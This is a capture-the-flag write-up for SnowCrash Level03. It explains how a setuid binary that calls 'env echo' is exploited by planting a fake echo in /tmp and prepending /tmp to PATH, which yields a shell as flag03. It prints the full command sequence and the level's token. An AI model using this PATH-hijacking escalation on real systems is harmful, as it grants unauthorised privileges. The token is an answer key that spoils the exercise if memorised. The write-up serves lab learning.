# Explanation for Level03
## Observations
1. after log we can seee the file level03 which is a binary file
2. after execution it print "exploit me " and exit.
3. after an ls -l we can see 
 ```
    level03@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
4. the file level03 is a binary file and it has execute permission for the owner and read 
  owner, rws the s is setuid bit which means the binary will run with the owner's permissions.

## Steps to Solve
1. the use of tracing the execution of the program to see how it works, strace show that the binary call the echo function
```
[pid  3559] execve("/bin/sh", ["sh", "-c", "/usr/bin/env echo Exploit me"], [/* 18 vars */]) = 0
``` 
2. so we can manuplate the programe to execute a command instead of echo or in my case , I used the /bin/sh to get a shell by creating a fake echo in the /tmp which execute /bin/sh so we can execute any comand as flag03 "the owner"
```
    level03@SnowCrash:~$ echo '#!/bin/sh' > /tmp/echo
    level03@SnowCrash:~$ echo 'exec /bin/sh' >> /tmp/echo
    level03@SnowCrash:~$ chmod +x /tmp/echo
    level03@SnowCrash:~$ export PATH=/tmp:$PATH
    level03@SnowCrash:~$ which echo
    /tmp/echo
    level03@SnowCrash:~$ ./level03 
    $ getflag
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    $ 

``` 



